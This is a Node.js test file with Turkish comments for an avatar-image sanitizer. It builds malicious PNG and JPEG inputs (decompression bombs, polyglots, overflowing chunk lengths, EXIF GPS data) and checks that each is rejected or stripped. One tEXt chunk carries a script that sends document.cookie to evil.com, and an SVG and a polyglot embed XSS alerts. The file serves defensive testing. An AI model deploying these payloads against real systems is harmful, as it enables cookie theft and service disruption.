'use strict';

const zlib = require('node:zlib');
const crypto = require('node:crypto');

const {
  sanitizeAvatar, ImageRejected, MAX_DIMENSION, MAX_FILE_BYTES, crc32,
} = require('../core/image-guard');

// Profil fotoğrafı yüklemenin saldırı yüzeyi.
//
// Buradaki yükler uydurma değil: her biri, kullanıcı tarafından yüklenen
// görselleri işleyen sistemlerde gerçekten kullanılmış bir sınıfı temsil ediyor.

let checks = 0;
function check(name, condition) {
  checks += 1;
  if (!condition) throw new Error(`check failed: ${name}`);
  console.log(`  ok ${name}`);
}

const PNG_MAGIC = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);

function chunk(type, data) {
  const out = Buffer.alloc(12 + data.length);
  out.writeUInt32BE(data.length, 0);
  out.write(type, 4, 'ascii');
  data.copy(out, 8);
  out.writeUInt32BE(crc32(out.subarray(4, 8 + data.length)), 8 + data.length);
  return out;
}

/** Gerçek, geçerli bir PNG üretir (düz renk). */
function makePng(width, height, { extraChunks = [], idatOverride = null } = {}) {
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8;   // bit depth
  ihdr[9] = 6;   // RGBA
  ihdr[10] = 0; ihdr[11] = 0; ihdr[12] = 0;

  let idatData = idatOverride;
  if (!idatData) {
    const raw = Buffer.alloc(height * (1 + width * 4));
    for (let y = 0; y < height; y++) {
      const rowStart = y * (1 + width * 4);
      raw[rowStart] = 0; // filter: none
      for (let x = 0; x < width; x++) {
        const p = rowStart + 1 + x * 4;
        raw[p] = 0x30; raw[p + 1] = 0x60; raw[p + 2] = 0xd0; raw[p + 3] = 0xff;
      }
    }
    idatData = zlib.deflateSync(raw);
  }

  return Buffer.concat([
    PNG_MAGIC,
    chunk('IHDR', ihdr),
    ...extraChunks,
    chunk('IDAT', idatData),
    chunk('IEND', Buffer.alloc(0)),
  ]);
}

function rejects(bytes, expectedReason) {
  try { sanitizeAvatar(bytes); return false; }
  catch (e) {
    if (!(e instanceof ImageRejected)) throw e;
    return expectedReason ? e.reason === expectedReason : true;
  }
}

function main() {
  console.log('\n[1] Geçerli avatar kabul ediliyor');
  const good = makePng(256, 256);
  const clean = sanitizeAvatar(good);
  check('256x256 PNG kabul edildi', clean.format === 'png');
  check('boyutlar okundu', clean.width === 256 && clean.height === 256);
  check('content-type baytlardan belirlendi', clean.contentType === 'image/png');
  check('çıktı geçerli PNG', clean.bytes.subarray(0, 8).equals(PNG_MAGIC));

  const small = sanitizeAvatar(makePng(64, 64));
  check('küçük görsel de kabul ediliyor', small.width === 64);

  console.log('\n[2] Boyut sınırı — ÇÖZMEDEN ÖNCE uygulanıyor');
  check('257x256 reddedildi', rejects(makePng(257, 256), 'too_large'));
  check('256x257 reddedildi', rejects(makePng(256, 257), 'too_large'));

  console.log('\n[3] Sıkıştırma bombası');
  // Klasik saldırı: başlıkta devasa boyut, dosyada birkaç KB. Bir çözücü bunu
  // açmaya kalkarsa piksel tamponu için gigabaytlar ayırmaya çalışır.
  const bombHeader = makePng(60000, 60000, { idatOverride: zlib.deflateSync(Buffer.alloc(1024)) });
  check('devasa boyut beyan eden dosya reddedildi', rejects(bombHeader, 'too_large'));
  check('dosya küçük olmasına rağmen reddedildi', bombHeader.length < 5000);

  // İkinci biçim: boyutlar makul ama IDAT çok daha fazlasını açıyor.
  const overIdat = zlib.deflateSync(Buffer.alloc(50 * 1024 * 1024, 0));
  const bombIdat = makePng(16, 16, { idatOverride: overIdat });
  check('boyutla tutarsız IDAT reddedildi', rejects(bombIdat, 'bomb'));
  check('bu dosya da küçük', bombIdat.length < 60 * 1024);

  console.log('\n[4] Gömülü yük ve meta veri temizleniyor');
  const payload = Buffer.from('<script>fetch("https://evil.com?c="+document.cookie)</script>');
  const withPayload = makePng(64, 64, {
    extraChunks: [
      chunk('tEXt', Buffer.concat([Buffer.from('Comment\0'), payload])),
      chunk('iTXt', Buffer.from('evil')),
      chunk('iCCP', Buffer.alloc(2048)),
    ],
  });
  check('yük taşıyan dosya girdide mevcut', withPayload.includes(payload));
  const sanitized = sanitizeAvatar(withPayload);
  check('yük çıktıda YOK', !sanitized.bytes.includes(payload));
  check('tEXt bölümü çıktıda yok', !sanitized.bytes.includes(Buffer.from('tEXt')));
  check('iCCP bölümü çıktıda yok', !sanitized.bytes.includes(Buffer.from('iCCP')));
  check('çıktı hâlâ geçerli ve okunabilir', sanitizeAvatar(sanitized.bytes).width === 64);
  check('çıktı girdiden küçük', sanitized.bytes.length < withPayload.length);

  console.log('\n[5] Biçim beyaz listesi');
  const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
  check('SVG reddedildi', rejects(svg, 'unsupported'));
  check('GIF reddedildi', rejects(Buffer.from('GIF89a' + '\0'.repeat(20)), 'unsupported'));
  check('BMP reddedildi', rejects(Buffer.concat([Buffer.from('BM'), Buffer.alloc(50)]), 'unsupported'));
  check('düz metin reddedildi', rejects(Buffer.from('merhaba'), 'unsupported'));
  check('boş dosya reddedildi', rejects(Buffer.alloc(0), 'empty'));

  console.log('\n[6] Polyglot: hem PNG hem HTML');
  // Sihirli baytlar PNG ama içinde HTML var. Tarayıcı içerik tipini koklarsa
  // script çalışır; yeniden inşa, HTML'i taşıyan bölümü zaten atar.
  const polyglot = makePng(32, 32, {
    extraChunks: [chunk('tEXt', Buffer.from('x\0<html><script>alert(1)</script></html>'))],
  });
  const cleanedPoly = sanitizeAvatar(polyglot);
  check('HTML çıktıda yok', !cleanedPoly.bytes.includes(Buffer.from('<script>')));

  console.log('\n[7] Bozuk / kötü niyetli yapı');
  check('IHDR olmayan PNG reddedildi',
    rejects(Buffer.concat([PNG_MAGIC, chunk('IDAT', Buffer.alloc(4))]), 'malformed'));
  check('sıfır boyut reddedildi', rejects(makePng(0, 0), 'malformed'));

  // Chunk uzunluğu dosya sınırının ötesini gösteriyor -- tampon taşması denemesi.
  const truncated = Buffer.concat([PNG_MAGIC, Buffer.from([0x7f, 0xff, 0xff, 0xff]), Buffer.from('IHDR')]);
  check('taşan chunk uzunluğu reddedildi', rejects(truncated, 'malformed'));

  console.log('\n[8] Dosya boyutu tavanı');
  const huge = Buffer.concat([makePng(64, 64), crypto.randomBytes(MAX_FILE_BYTES)]);
  check(`${Math.floor(MAX_FILE_BYTES / 1024)} KB üstü reddedildi`, rejects(huge, 'too_large'));

  console.log('\n[9] JPEG');
  // SOF0 ile minimal ama geçerli yapıda bir JPEG başlığı.
  function makeJpeg(width, height, { withExif = false } = {}) {
    const sof = Buffer.alloc(19);
    sof.writeUInt16BE(0xffc0, 0);
    sof.writeUInt16BE(17, 2);
    sof[4] = 8;
    sof.writeUInt16BE(height, 5);
    sof.writeUInt16BE(width, 7);
    sof[9] = 3;
    let exif = Buffer.alloc(0);
    if (withExif) {
      const payload = Buffer.from('Exif\0\0GPS:41.0082,28.9784');
      const header = Buffer.alloc(4);
      header.writeUInt16BE(0xffe1, 0);
      // Uzunluk alanı KENDİSİNİ de sayar (2 bayt) -- JPEG segmentlerinde en sık
      // yapılan hata budur ve ayrıştırıcıyı segment ortasına düşürür.
      header.writeUInt16BE(payload.length + 2, 2);
      exif = Buffer.concat([header, payload]);
    }
    return Buffer.concat([
      Buffer.from([0xff, 0xd8]), exif, sof,
      Buffer.from([0xff, 0xda, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3f, 0x00]),
      Buffer.from([0xff, 0xd9]),
    ]);
  }
  const jpeg = sanitizeAvatar(makeJpeg(200, 150));
  check('JPEG kabul edildi', jpeg.format === 'jpeg');
  check('JPEG boyutları okundu', jpeg.width === 200 && jpeg.height === 150);
  check('büyük JPEG reddedildi', rejects(makeJpeg(1000, 1000), 'too_large'));

  const withGps = makeJpeg(100, 100, { withExif: true });
  check('EXIF girdide mevcut', withGps.includes(Buffer.from('GPS:41.0082')));
  const strippedJpeg = sanitizeAvatar(withGps);
  check('EXIF (ve GPS konumu) çıktıda YOK',
    !strippedJpeg.bytes.includes(Buffer.from('GPS:41.0082')));

  console.log(`\nOK - görsel koruması: ${checks} kontrol geçti.`);
}

main();
